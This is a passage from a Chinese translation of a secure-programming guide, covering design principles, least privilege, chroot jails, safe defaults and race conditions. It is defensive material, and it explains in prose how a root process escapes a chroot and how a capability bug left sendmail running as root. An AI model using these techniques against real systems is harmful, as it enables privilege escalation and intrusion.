一些程序设计相对容易安全；而另一些则几乎不可能安全。如果你想有一个安全的应用程序，你需要遵循良好的安全设计原则。特别是，你应该最小化你的程序（及其部分）拥有的权限，这样不可避免的错误就不太可能成为安全漏洞。

# 7.1\. 遵循良好的安全设计原则

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/follow-good-principles.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/follow-good-principles.html)

Saltzer [1974] 和后来的 Saltzer 和 Schroeder [1975] 在创建安全程序时列出了以下设计原则，这些原则至今仍然有效：

+   *最小权限*. 每个用户和程序应尽可能使用最少的权限进行操作。这个原则限制了意外、错误或攻击造成的损害。它还减少了特权程序之间潜在交互的数量，因此无意、不希望或不恰当使用权限的可能性较小。这个想法可以扩展到程序内部：只有需要那些权限的最小部分程序才应该拥有它们。参见第 7.4 节了解更多关于如何做到这一点的方法。

+   *机制经济/简洁性*. 保护系统的设计应尽可能简单和小巧。用他们的话说，“对软件进行逐行检查和实施保护机制硬件的物理检查等技术是必要的。为了使这些技术成功，简单小巧的设计是至关重要的。”这有时被描述为“KISS”原则（“保持简单，傻瓜”）。

+   *开放设计*. 保护机制不应依赖于攻击者的无知。相反，机制应该是公开的，依赖于相对较少（且易于更改）的物品的保密性，如密码或私钥。开放设计使得广泛的公众审查成为可能，同时也使用户能够确信即将使用的系统是足够的。坦白地说，试图维护广泛分布的系统的保密性并不现实；反编译器和被篡改的硬件可以迅速暴露实现中的任何“秘密”。即使你假装源代码是发现漏洞的必要条件（其实不是），源代码也经常被盗用和重新分发（至少从思科那里一次，从微软那里两次）。这是基于多年密码学经验的一个古老且得到广泛支持的原则。例如，较老的凯克霍夫定律指出，“一个密码系统应该设计成在除了密钥信息之外的所有信息都已知的情况下是安全的。”信息论发明者克劳德·香农将凯克霍夫定律重新表述为：“[假设]敌人了解系统。”确实，安全专家布鲁斯·施奈尔更进一步，认为聪明的工程师应该“要求与安全相关的任何东西都使用开源代码”，并确保它得到广泛的审查，以及任何识别出的问题都得到修复[Schneier 1999]。

+   *完全中介*. 每个访问尝试都必须进行检查；将机制定位在无法被篡改的位置。这个目标的同义词是*不可绕过性*。例如，在客户端-服务器模型中，通常服务器必须执行所有访问检查，因为用户可以构建或修改自己的客户端。这是第五章以及第 7.2 节中的要点。

+   *安全默认设置（例如，基于权限的方法）*。 默认应该是拒绝服务，然后保护方案应确定允许访问的条件。更多信息请参阅第 7.7 节和第 7.10 节。

+   *权限分离*. 理想情况下，对对象的访问应依赖于多个条件，这样破坏一个保护系统就不会导致完全访问。

+   *最少的共享机制*. 最小化共享机制的数量和使用（例如，使用 /tmp 或 /var/tmp 目录）。共享对象提供了潜在危险的信息流动和意外交互的渠道。更多信息请参阅第 7.11 节。

+   *心理可接受性/易于使用*. 人类界面必须设计得易于使用，以便用户会例行公事地自动正确使用保护机制。如果安全机制与用户对其保护目标的思维模式紧密匹配，错误就会减少。

在彼得·纽曼的[《原则性可信赖的可组合架构》](http://www.csl.sri.com/users/neumann/chats.html#4)中可以找到关于各种安全设计原则的良好概述。关于考虑这些问题的完全失败案例（不仅限于信息技术），请参阅[隐私国际的“愚蠢安全”竞赛”获奖者](http://www.privacyinternational.org/activities/stupidsecurity)。

# 7.3\. 分离数据和控制

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/data-vs-control.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/data-vs-control.html)

你支持的任何文件都应设计为完全分离（被动）数据和执行程序。可以使用应用程序和数据查看器来显示外部开发的文件，因此通常不允许它们接受程序（也称为“脚本”或“宏”）。最危险的一种是自动执行的宏，它在应用程序加载时以及数据最初显示时执行；从安全角度来看，这通常是一个即将发生的灾难。

如果你确实必须支持远程下载的程序（例如，为了实现现有标准），确保你对宏可以执行的操作有极其严格的控制（这通常被称为“沙盒”）。过去的经验表明，真正的沙盒很难正确实现。事实上，我记不起有任何广泛使用的沙盒没有被反复利用（是的，包括 Java）。如果可能的话，至少将程序存储在单独的文件中，这样在发现但尚未修复另一个沙盒漏洞时，更容易将其屏蔽。将它们分开存储也更容易重用代码，并在需要时缓存它。

# 7.4\. 最小化权限

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/minimize-privileges.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/minimize-privileges.html)

如前所述，程序具有完成其工作所需的最小权限是一个重要的基本原则（这被称为“最小权限”）。这样，如果程序被破坏，其损害就会受到限制。最极端的例子是根本不编写安全的程序 - 如果可以这样做，通常应该这样做。例如，如果你可以，不要让你的程序设置为 uid 或 setgid；只需将其作为普通程序，并要求管理员在运行它之前登录为该用户。

在 Linux 和 Unix 中，进程权限的主要决定因素是与它关联的 id 集合：每个进程都有一个真实用户 id、有效用户 id 和保存用户 id，以及真实组 id、有效组 id 和保存组 id（一些非常古老的 Unix 系统没有“保存”的 id）。Linux 还有一个特殊扩展，为每个进程提供单独的文件系统 UID 和 GID。操作这些值对于保持权限最小化至关重要，并且有几种方法可以最小化它们（下面将讨论）。您还可以使用 chroot(2) 来最小化程序可见的文件，尽管使用 chroot() 可能难以正确使用。Linux 和 Unix 中还有一些其他决定权限的值，例如 POSIX 能力（由 Linux 2.2 及更高版本和一些其他类 Unix 系统支持）。

## 7.4.1\. 最小化授予的权限

可能最有效的方法是简单地最小化授予的最高权限。特别是，如果可能的话，避免授予程序 root 权限。如果程序只需要访问一小组文件，不要将其设置为 *setuid root*；考虑为不同的功能创建单独的用户或组账户。

常用的技术是创建一个特殊组，将文件的组所有权更改为该组，然后使程序对那个组进行 *setgid* 设置。在可能的情况下，最好将程序设置为 *setgid* 而不是 *setuid*，因为组成员资格赋予的权利较少（特别是，它不赋予更改文件权限的权利）。

这通常用于游戏高分。游戏通常设置为组 *games*，分数文件由组 *games* 拥有，而程序及其配置文件则由其他人（例如 root）拥有。因此，破解游戏允许犯罪者更改高分，但不会赋予更改游戏的可执行文件或配置文件的权限。后者很重要；如果攻击者能够更改游戏的可执行文件或其配置文件（这些文件可能控制可执行文件运行的内容），那么他们可能能够控制运行游戏的用户。

如果创建一个新的组还不够，考虑创建一个新的伪用户（实际上，是一个特殊角色）来管理一组资源——通常还会创建一个新的伪组（再次，是一个特殊角色）仅用于运行程序。Web 服务器通常这样做；通常 Web 服务器会配置一个特殊用户（“nobody”），以便它们可以与其他用户隔离。确实，Web 服务器在这里很有教育意义：Web 服务器通常需要 root 权限才能启动（以便它们可以连接到端口 80），但一旦启动，它们通常会放弃所有权限并以用户“nobody”的身份运行。然而，不要使用“nobody”账户（除非你在编写 Web 服务器）；相反，创建你自己的伪用户或新组。这种方法的目的是通过利用操作系统将用户和组分开的能力，将不同的程序、进程和数据相互隔离。如果不同的程序共享相同的账户，那么攻破一个程序也将赋予对另一个程序的权限。通常，伪用户不应该拥有它运行的程序；这样，攻击者攻破账户后也无法更改运行的程序。通过将系统的不同部分隔离到运行不同的用户和组中，攻破一个部分并不一定会破坏整个系统的安全性。

如果你正在使用数据库系统（例如，通过调用其查询接口），限制应用程序使用的数据库用户的权限。例如，如果该用户只需要访问少数几个用户定义的存储过程，不要给该用户访问所有系统存储过程的权限。在存储过程中尽可能做所有事情。这样，即使有人设法将任意字符串强制输入查询中，造成的损害也会受到限制。如果你必须直接传递带有客户端提供数据的常规 SQL 查询（而你通常不应该这样做），请将其包装在限制其活动的东西中（例如，sp_sqlexec）。（感谢 SPI Labs 提供这些数据库系统建议）。

如果你*必须*给予一个程序通常为 root 保留的权限，考虑在程序能够最小化其可用权限的情况下尽快使用 POSIX 功能。POSIX 功能在 Linux 2.2 以及许多其他类 Unix 系统中可用。通过在启动后立即调用 cap_set_proc(3)或 Linux 特定的 capsetp(3)例程，你可以永久性地减少程序的能力，仅限于它实际需要的那些能力。例如，网络时间守护进程（ntpd）传统上以 root 身份运行，因为它需要修改当前时间。然而，已经开发出了补丁，使得 ntpd 只需要单个功能，CAP_SYS_TIME，因此即使攻击者控制了 ntpd，利用程序也相对困难。

我说“有些限制”，因为除非采取其他步骤，否则使用 POSIX 功能保留特权需要进程继续拥有 root 用户 ID。由于许多重要文件（配置文件、二进制文件等）属于 root，攻击者控制具有这种有限功能的程序仍然可以修改关键系统文件并获得完整的 root 级权限。Linux 内核扩展（在 2.4.X 和 2.2.19+ 版本中可用）提供了一种更好的方法来限制可用权限：程序可以以 root 身份（具有所有 POSIX 功能）启动，将其功能修剪到仅需要的部分，调用 prctl(PR_SET_KEEPCAPS,1)，然后使用 setuid() 切换到非 root 进程。PR_SET_KEEPCAPS 设置标记了一个进程，使得当进程执行 setuid 到非零值时，功能不会被清除（通常会被清除）。此进程设置在 exec() 时会被清除。然而，请注意，PR_SET_KEEPCAPS 是 Linux 独有的扩展，适用于 Linux 内核的新版本。

您可以使用由 SuSE 开发的“compartment”工具来简化最小化授予的权限。这个工具仅在 Linux 上工作，设置文件系统根、uid、gid 和/或功能集，然后运行指定的程序。这对于运行某些其他程序而不修改它特别有用。以下是版本 0.5 的语法：

```
 
Syntax: compartment [options] /full/path/to/program

Options:
  --chroot path   chroot to path
  --user user     change UID to this user
  --group group   change GID to this group
  --init program  execute this program before doing anything
  --cap capset    set capset name. You can specify several
  --verbose       be verbose
  --quiet         do no logging (to syslog)
```

因此，你可以使用以下方法启动一个更安全的匿名 ftp 服务器：

```
   compartment --chroot /home/ftp --cap CAP_NET_BIND_SERVICE anon-ftpd
```

在撰写本文时，该工具尚不成熟，且在典型的 Linux 发行版上不可用，但这种情况可能会很快改变。您可以通过 [`www.suse.de/~marc`](http://www.suse.de/~marc) 下载该程序。还有一个类似的工具叫做 dreamland；您可以在 [`www.7ka.mipt.ru/~szh/dreamland`](http://www.7ka.mipt.ru/~szh/dreamland) 找到它。

注意，并非所有类 Unix 系统都实现了 POSIX 功能，PR_SET_KEEPCAPS 目前仅是 Linux 的扩展。因此，这些方法限制了可移植性。然而，如果你仅将其作为可选的安全保障，并且仅在可用时使用，这种方法实际上并不会限制可移植性。此外，虽然 Linux 内核版本 2.2 及以上包含了低级调用，但某些 Linux 发行版上并未安装用于简化这些调用的 C 级库，这稍微增加了它们在应用程序中的使用复杂性。有关 Linux 对 POSIX 功能的实现信息，请参阅 [`linux.kernel.org/pub/linux/libs/security/linux-privs`](http://linux.kernel.org/pub/linux/libs/security/linux-privs)。

FreeBSD 有 jail() 函数用于限制权限；有关更多信息，请参阅 [jail 文档](http://docs.freebsd.org/44doc/papers/jail/jail.html)。有许多专门的工具和扩展用于限制权限；请参阅 第 3.10 节。

## 7.4.2. 最小化特权使用时间

尽快永久放弃特权。一些类 Unix 系统，包括 Linux，实现了“保存”的 ID，这些 ID 存储了“之前的”值。最简单的方法是如果适当的话重置任何补充组（例如，使用 setgroups(2)），然后两次将其他 id 设置为不可信的 id。在 setuid/setgid 程序中，通常应将实际 gid 和 uid 设置为真实值，特别是在 fork(2)之后，除非有充分的理由不这样做。请注意，在从 root 降至其他特权之前必须首先更改 gid，否则将不起作用——一旦放弃 root 权限，您将无法更改其他很多内容。请注意，在某些系统中，仅设置组是不够的，如果进程属于具有特权的补充组。例如，“rsync”程序在更改其 uid 和 gid 时没有删除补充组，这可能导致潜在的漏洞。

值得注意的是，有一个已知的与此相关的漏洞，它使用 POSIX 能力来干扰这种最小化。此漏洞影响 Linux 内核 2.2.0 至 2.2.15 版本，以及可能许多其他具有 POSIX 能力的类 Unix 系统。有关更多信息，请参阅 http://www.securityfocus.com 上的 Bugtraq id 1322。以下是他们的摘要：

> POSIX "能力"最近已在 Linux 内核中实现。这些"能力"是特权控制的附加形式，以实现更具体的控制，以便对特权进程可以执行的操作进行更精确的控制。能力作为三个（相当大的）位字段实现，每个位代表特权进程可以执行的具体操作。通过设置特定的位，可以控制特权进程的操作——仅向程序中需要它们的特定部分授予各种函数的访问权限。这是一项安全措施。问题是能力会随着 fork() execs 而复制，这意味着如果父进程修改了能力，它们可以被携带过来。这种可以利用的方式是将三个位字段中的所有能力都设置为 0（即，所有位都关闭），然后执行一个尝试在执行可能以 root 身份运行的危险代码之前放弃特权的 setuid 程序，例如 sendmail 所做的那样。当 sendmail 尝试使用 setuid(getuid())放弃特权时，由于它的位字段中没有执行此操作所需的能力，并且没有对其返回值进行检查，因此它将失败。它将继续以超级用户权限执行，并可以以 root 身份运行用户的.forward 文件，从而导致完全妥协。

一种方法，sendmail 使用的方法，是在 setuid(getuid())之后尝试执行 setuid(0)；通常这应该失败。如果成功，程序应该停止。有关更多信息，请参阅 http://sendmail.net/?feed=000607linuxbug。在短期内，在其他程序中这可能是一个好主意，尽管显然更好的长期方法是升级底层系统。

## 7.4.3\. 最小化权限激活时间

使用`setuid(2)`、`seteuid(2)`、`setgroups(2)`和相关函数来确保程序仅在必要时才激活这些权限，并在不使用时临时禁用这些权限。如上所述，你可能希望在解析用户输入时禁用这些权限，但更普遍的做法是仅在确实需要时才启用权限。

注意，一些缓冲区溢出攻击如果成功，可以强制程序运行任意代码，而这代码可以重新启用临时放弃的权限。因此，有许多攻击是临时禁用权限无法抵制的——总是最好尽可能快地完全放弃权限。有许多论文描述了如何做到这一点，例如 ["Designing Shellcode Demystified"](http://www.enderunix.org/docs/en/sc-en.txt)。有些人甚至声称“`seteuid()`被认为是有害的”，因为它无法抵制的攻击很多。尽管如此，临时禁用这些权限可以防止一类攻击，例如说服程序写入它可能没有打算写入的文件的技术。由于这种技术可以防止许多攻击，如果在该程序的那个点无法永久放弃权限，那么这样做是值得的。

## 7.4.4\. 最小化被授予权限的模块

如果只有少数模块被授予权限，那么确定它们是否安全就更容易。一种方法是让单个模块使用权限然后放弃，这样后续调用的其他模块就无法滥用权限。另一种方法是使用不同的可执行文件中的单独命令；一个命令可能是一个复杂的工具，可以为特权用户（例如 root）执行大量任务，而另一个工具是`setuid`，但它是一个小而简单的工具，只允许一小部分命令子集（并且不信任其调用者）。这个小而简单的工具会检查输入是否符合各种可接受标准，然后如果确定输入是可接受的，它将数据传递给复杂的工具。请注意，这个小而简单的工具必须彻底检查其输入并限制传递给复杂工具的内容，否则这可能是一个漏洞。通信可以通过 shell 调用或任何 IPC 机制进行。这些方法甚至可以以多种方式分层，例如，一个复杂的用户工具可以调用一个简单的`setuid`“包装”程序（该程序检查其输入是否为安全值），然后将其传递给另一个复杂的可信工具。

这种方法通常是开发基于 GUI 的应用程序的标准方法，这些应用程序需要权限，但必须由无权限的用户运行。GUI 部分作为普通无权限用户进程运行；然后该进程将安全相关的请求传递给另一个具有特殊权限的进程（并且不信任第一个进程，但将请求限制在用户被允许做的范围内）。永远不要开发既具有权限（例如，使用 setuid）又直接调用图形工具包的程序：图形工具包不是为此目的设计的，要审计图形工具包以使其成为可能将极其困难。从根本上说，图形工具包必须很大，对如此多的代码的完美性抱有如此大的信心是极其不明智的，因此尝试让它们做不应该做的事情是没有意义的。您可以自由地创建一个小型 setuid 程序，该程序调用两个不同的程序：一个没有权限（但有图形界面），另一个有权限（但没有外部接口）。或者，创建一个小型 setuid 程序，该程序可以被无权限的 GUI 应用程序调用。但永远不要将这两个合并成一个单独的进程。有关更多信息，请参阅 Owen Taylor 关于 GTK 和 setuid 的声明，讨论为什么 GTK_MODULES 不是一个安全漏洞（[Owen Taylor 关于 GTK 和 setuid 的声明](http://www.gtk.org/setuid.html)）。

一些应用程序最好通过将问题分解成更小、相互不信任的程序来开发。一种简单的方法是将问题分解成单独的程序，每个程序只做一件事情（安全地），使用文件系统和锁定来防止它们之间出现问题。如果需要更复杂的交互，一种方法是将进程分叉成多个，每个进程有不同的权限。通信通道可以以多种方式设置；一种方式是让“主”进程创建通信通道（例如未命名的管道或未命名的套接字），然后分叉成不同的进程，并让每个进程尽可能多地放弃权限。如果你这样做，务必注意死锁。然后使用简单的协议允许不太受信任的进程请求来自更受信任的进程（或多个进程）的操作，并确保更受信任的进程只支持有限的一组请求。设置用户和组权限，使得其他人甚至无法启动子程序，这使得入侵更加困难。

一些操作系统在单个进程中具有多层信任的概念，例如 Multics 的环。标准的 Unix 和 Linux 没有一种方法可以在单个进程中通过功能来分离多个信任级别，如这种调用内核会增加权限，但除此之外，给定的进程只有一个信任级别。这是 Java 2、C#（它复制了 Java 的方法）和 Fluke（安全增强 Linux 的基础）等技术具有优势的一个领域。例如，Java 2 可以指定细粒度的权限，例如仅打开特定文件的权限。然而，通用操作系统在此时尚不具备这种能力；这可能在不久的将来改变。有关 Java 的更多信息，请参阅第 10.6 节。

## 7.4.5\. 考虑使用 FSUID 来限制权限

每个 Linux 进程都有两个 Linux 特有的状态值，称为文件系统用户 ID（FSUID）和文件系统组 ID（FSGID）。这些值在检查文件系统权限时使用。如果你正在构建一个为任意用户操作文件服务器（如 NFS 服务器）的程序，你可能考虑使用这些 Linux 扩展。要使用它们，在保持 root 权限的情况下，在代表普通用户访问文件之前，只需更改 FSUID 和 FSGID。这个扩展相当有用，提供了一种在不移除其他（可能必要的）权利的情况下限制文件系统访问权限的机制。通过仅设置 FSUID（而不是 EUID），本地用户不能向进程发送信号。此外，在这种情况下避免竞争条件要容易得多。然而，这种方法的一个缺点是，这些调用不能移植到其他类 Unix 系统。

## 7.4.6\. 考虑使用 Chroot 来最小化可用的文件

你可以使用 chroot(2)来限制程序可见的文件。这需要仔细设置一个目录（称为“chroot 监狱”）并正确进入。这可以是一种相当有效的提高程序安全性的技术——很难干扰你看不见的文件。然而，它依赖于一系列假设，特别是程序必须没有 root 权限，它必须没有获得 root 权限的任何方法，并且 chroot 监狱必须正确设置（例如，小心你放在 chroot 监狱里的东西，并确保在调用 chroot 之前用户永远不能控制其内容）。我建议在合理的地方使用 chroot(2)，但不要仅依赖于它；相反，将其作为一系列防御措施的一部分。以下是关于 chroot(2)使用的一些注意事项：

+   程序仍然可以使用在整个机器上共享的非文件系统对象（例如 System V IPC 对象和网络套接字）。最好也使用单独的伪用户和/或组，因为所有类 Unix 系统都包括隔离用户的能力；这至少可以限制被篡改的程序对其他程序造成的损害。请注意，当前大多数类 Unix 系统（包括 Linux）不会隔离有意合作的程序；如果你担心恶意程序的合作，你需要获得一个实现了某种形式的强制访问控制或/或限制隐蔽通道的系统。

+   一定要关闭所有指向外部文件的文件系统描述符，如果你不想它们以后被使用。特别是，不要有任何描述符指向 chroot 监狱外的目录，或者设置一个可能导致这种描述符被赋予它的环境（例如，通过 Unix 套接字或旧的 /proc 实现）。如果程序被赋予了指向 chroot 监狱外目录的描述符，它可能被用来逃离 chroot 监狱。

+   chroot 监狱必须被设置为安全的——它永远不能被用户控制，并且添加的每个文件都必须仔细检查。不要使用普通用户的家目录、子目录或其他可能被用户控制的目录作为 chroot 监狱；使用专门为该目的设置的单独目录。使用由用户控制的目录是一场灾难——例如，用户可以创建一个包含木马链接器或 libc 的“lib”目录（如果保存的文件不使用它，还可以将 setuid root 二进制文件链接到该空间）。只放置绝对必要的最少文件和目录。通常你会有一个 /bin、/etc/、/lib，可能还有一个或两个其他目录（例如，如果是一个 ftp 服务器，则为 /pub）。在 /bin 中只放置在执行 chroot() 后需要运行的文件，有时可能什么都不需要（尽管有时可能无法避免放置一个像 /bin/sh 这样的 shell）。你可能需要一个 /etc/passwd 和 /etc/group 以便文件列表可以显示一些正确的名称，但如果需要，尽量不包含真实系统的值，并且当然用 "*" 替换所有密码。

    你需要确保运行中的程序拥有所有可执行代码（包括库），或者 chroot 监狱中包含你需要的代码。你应该只将你需要的内容放入 chroot 监狱。你可以重新编译任何必要的程序以静态链接，这样它们就不需要动态加载的库。如果你使用动态加载的库，只包含你需要的那些；使用 ldd(1)查询/bin 中的每个程序以找出它需要什么（通常它们位于/lib 或/usr/lib）。在 Linux 上，你可能需要一些基本库，如 ld-linux.so.2，在某些情况下可能不需要其他库。你还可以使用 LD_PRELOAD 强制将一些库加载到可执行文件的区域，这有时可能会有帮助。关于如何使用 chroot 监狱的更长时间讨论可以在[Marc Balmer 的《使用 OpenBSD 的 chrooted httpd》](http://www.etc.msys.ch/docs/chrooted_httpd.pdf)中找到。Balmer 的论文专门讨论了在 chroot 监狱中使用 Apache，但他讨论的方法也可以应用于其他地方。

    通常，完全复制所有文件比创建硬链接更明智；虽然这会浪费一些时间和磁盘空间，但它使得对 chroot 监狱文件的攻击不会自动传播到常规系统的文件中。在支持这种做法的系统中挂载/proc 文件系统通常是不明智的。事实上，在非常旧的 Linux 版本（至少是 2.0.x 版本，直到 2.0.38）中，这是一个已知的漏洞，因为/proc 中有伪目录，这会允许 chroot 程序逃逸。Linux 内核 2.2 修复了这个已知问题，但可能还有其他问题；如果可能的话，不要这样做。

+   如果程序能够获取 root 权限，那么 chroot 实际上并不有效。例如，程序可以使用 mknod(2)这样的调用创建一个可以查看物理内存的设备文件，然后使用这个设备文件修改内核内存，从而赋予自己所需的任何权限。另一个 root 程序如何从 chroot 中逃逸的例子可以在[`www.suid.edu/source/breakchroot.c`](http://www.suid.edu/source/breakchroot.c)中找到。在这个例子中，程序为当前目录打开一个文件描述符，创建并 chroot 到一个子目录中，将当前目录设置为之前打开的当前目录，然后从当前目录反复向上 cd（由于它位于当前 chroot 之外，因此成功移动到真正的文件系统根目录），然后对结果调用 chroot。在你阅读这段文字的时候，这些弱点可能已经被修补，但现实是，root 权限传统上意味着“所有权限”，而且很难剥夺它们。对于需要持续 root 权限的程序，使用 chroot()只能稍微有所帮助。当然，你可能能够将程序分解成几个部分，这样至少其中一部分可以在 chroot 监狱中运行。

## 7.4.7. 考虑最小化可访问的数据

考虑最小化用户可以访问的数据量。例如，在 CGI 脚本中，除非用户需要直接查看数据，否则将 CGI 脚本使用的数据放置在文档树之外。有些人有一种错误的观念，认为如果不公开提供链接，就没有人可以访问数据，但这显然是不正确的。

## 7.4.8. 考虑最小化可用的资源

考虑最小化给定进程可用的计算机资源，这样即使它“失控”，其造成的损害也可以限制。这是防止拒绝服务的基本技术。对于网络服务器，一种常见的方法是为每个会话设置一个单独的进程，并为每个进程限制会话可以使用的 CPU 时间（等等）。这样，如果攻击者发起一个消耗内存或使用 100% CPU 的请求，限制就会启动并防止单个会话干扰其他任务。当然，攻击者可以建立许多会话，但这至少提高了攻击的门槛。有关如何设置这些限制的更多信息，请参阅第 3.6 节。

# 7.6. 避免创建 setuid/setgid 脚本

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-setuid.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-setuid.html)

许多类 Unix 系统，特别是 Linux，简单地忽略脚本上的 setuid 和 setgid 位，以避免前面描述的竞争条件。由于类 Unix 系统对 setuid 脚本的支持各不相同，因此最好在可能的情况下避免在新应用程序中使用。作为一个特殊情况，Perl 包括一个特殊的设置来支持 setuid Perl 脚本，因此如果确实需要这种功能，在 Perl 中使用 setuid 和 setgid 是可以接受的。如果您需要在自己的解释器中支持这种功能，请检查 Perl 是如何做到这一点的。否则，一个简单的方法是使用一个小型 setuid/setgid 可执行文件“包装”脚本，创建一个安全的环境（例如，清除和设置环境变量），然后调用脚本（使用脚本的完整路径）。确保脚本不能被攻击者更改！Shell 脚本语言有额外的问题，并且绝对不应该设置 setuid/setgid；有关更多信息，请参阅第 10.4 节。

# 7.7\. 安全配置和使用安全默认值

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/safe-configure.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/safe-configure.html)

目前认为配置是最大的安全问题。因此，你应该花一些精力（1）确保初始安装安全，以及（2）在保持安全的同时使系统重新配置变得容易。

永远不要让安装程序安装一个可用的“默认”密码。如果你需要安装新的“用户”，那没问题——只需为他们设置一个难以破解的密码，留出时间让管理员设置密码（并在设置密码之前确保系统安全）。管理员可能会安装数百个软件包，几乎肯定会忘记设置密码——如果你创建了一个默认密码，他们甚至可能不知道需要设置它。

程序应该有最严格的访问策略，直到管理员有机会对其进行配置。请不要创建“示例”工作用户或“允许所有访问”的配置作为起始配置；许多用户只是“安装一切”（安装所有可用的服务）而从未配置过许多服务。在某些情况下，程序可能能够通过依赖现有的认证系统（例如，一个 FTP 服务器可以合法地确定，如果一个用户可以登录到用户的目录，那么应该允许该用户访问该用户的文件）来判断更宽松的策略是合理的。然而，对这些假设要小心。

让安装脚本尽可能安全地安装程序。默认情况下，将所有文件安装为 root 或其他系统用户所有，并使它们对其他人不可写；这防止了非 root 用户安装病毒。实际上，最好使它们对所有非信任用户不可读。在可能的情况下，也允许非 root 安装，这样没有 root 权限的用户和不太信任安装程序的管理员仍然可以使用该程序。

在安装时，检查以确保所有必要的假设都是为了安全。一些库例程在某些平台上不安全；请参阅第 8.1 节中的讨论。如果你知道你的应用程序将在哪些平台上运行，你不需要检查它们的特定属性，但在那种情况下，你应该检查程序是否只安装在这些平台中的一个。否则，你应该要求手动覆盖以安装程序，因为你不知道结果是否安全。

努力使配置尽可能简单明了，包括安装后的配置。尽可能简化使用“安全”方法的过程，否则许多用户会在不了解风险的情况下使用不安全的方法。在 Linux 上，利用 linuxconf 等工具，使用户能够轻松地使用现有基础设施配置他们的系统。

如果有配置语言，默认情况下应该拒绝访问，直到用户明确授予访问权限。如果存在示例配置文件，请在其中包含许多清晰的注释，以便管理员了解配置的作用。

# 7.8\. 安全地加载初始化值

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/init-safe.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/init-safe.html)

许多程序读取初始化文件以允许配置其默认设置。你必须确保攻击者无法更改所使用的初始化文件，也无法创建或修改该文件。通常，你不应该*使用*当前目录作为此信息的来源，因为如果程序用作编辑器或浏览器，用户可能正在查看由其他人控制的目录。相反，如果程序是典型的用户应用程序，你应该从用户主目录中包含的隐藏文件或目录中加载任何用户默认设置。如果程序设置为 setuid/setgid，除非你仔细过滤它作为不受信任的（可能是有敌意的）输入，否则不要读取用户控制的任何文件。受信任的配置值应从其他地方加载（通常是从/etc 中的文件加载）。

# 7.9\. 最小化可访问数据

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/minimize-data-access.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/minimize-data-access.html)

一个高度相关的问题是，默认情况下，数据应该尽可能少地可访问。确保任何配置和数据文件都具有必要的最小权限。显然，确保只有授权用户可以写入这些文件。实际上，检查文件的权限可能是明智的，如果任意用户可以写入配置文件（或任意修改它们所在的目录），则停止处理。通常，安装配置文件以便普通用户无法读取也是明智的。

# 7.10\. 安全失败

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/fail-safe.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/fail-safe.html)

一个安全程序应该始终“安全失败”，也就是说，它应该设计成如果程序失败，应该产生最安全的结果。对于安全关键程序，这通常意味着如果检测到某种不当行为（格式错误的输入、达到“无法到达”的状态等），则程序应立即拒绝服务并停止处理该请求。不要试图“弄清楚用户想要什么”：只是拒绝服务。有时这可能会降低可靠性或可用性（从用户的角度来看），但它增加了安全性。有一些情况下可能不希望这样做（例如，拒绝服务比机密性或完整性的损失更糟糕），但这种情况相当罕见。

注意，我建议“停止处理请求”，而不是“完全失败”。特别是，大多数服务器在接收到格式不正确的输入时不应完全停止，因为这为拒绝服务攻击提供了一个简单的机会（攻击者只需发送垃圾位以阻止你使用该服务）。有时关闭整个服务器是必要的，特别是，达到某些“无法到达”的状态可能表明存在如此严重的问题，继续下去是不明智的。

当检测到失败时，仔细考虑你发送回的错误信息。如果你什么也不发送，可能很难诊断问题，但发送过多信息可能会无意中帮助攻击者。通常，最好的做法是回复“访问拒绝”或“遇到错误”并随后将更详细的信息写入审计日志（在那里你可以有更多控制权，决定谁可以看到信息）。

# 7.11\. 避免竞态条件

> 原文：[`dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html`](https://dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html)

“竞态条件”可以定义为“由于对事件相对时间的不预期的关键依赖而产生的异常行为” [FOLDOC]。竞态条件通常涉及一个或多个进程访问共享资源（如文件或变量），其中这种多访问没有得到适当的控制。

通常情况下，进程不会原子性地执行；另一个进程可能在任意两个指令之间中断它。如果一个安全程序的进程没有准备好应对这些中断，另一个进程可能能够干扰安全程序的进程。在安全程序中，任何一对操作都必须在任意数量的另一个进程的代码在它们之间执行时仍然正确工作。

竞态条件问题可以概念上分为两类：

+   由不受信任的进程引起的干扰。一些安全分类法将这个问题称为“序列”或“非原子”条件。这些是由运行其他、不同程序的进程引起的条件，它们在安全程序的步骤之间“插入”其他操作。这些其他程序可能是由攻击者专门调用以引起问题的。本书将把这些序列问题称为。

+   由受信任的进程引起的干扰（从安全程序的角度看）。一些分类法将这些称为死锁、活锁或锁定失败条件。这些是由运行“相同”程序的进程引起的条件。由于这些不同的进程可能具有“相同”的权限，如果未得到适当控制，它们可能以其他程序无法干扰的方式相互干扰。有时这种干扰可以被利用。本书将把这些锁定问题称为。

## 7.11.1\. 序列（非原子）问题

通常，你必须检查你的代码中任何可能在它们之间执行任意代码时失败的指令对。

注意，加载和保存共享变量通常作为单独的操作实现，并且不是原子的。这意味着“增加变量”操作通常被转换为加载、增加和保存操作，所以如果变量内存是共享的，其他进程可能会干扰增加操作。

安全程序必须确定是否应该批准请求，如果是的话，就要对那个请求采取行动。在程序采取行动之前，不应有任何方式让不受信任的用户更改用于此决定的任何内容。这种竞争条件有时被称为*检查时间-使用时间*（TOCTOU）竞争条件。

### 7.11.1.1\. 文件系统中的原子操作

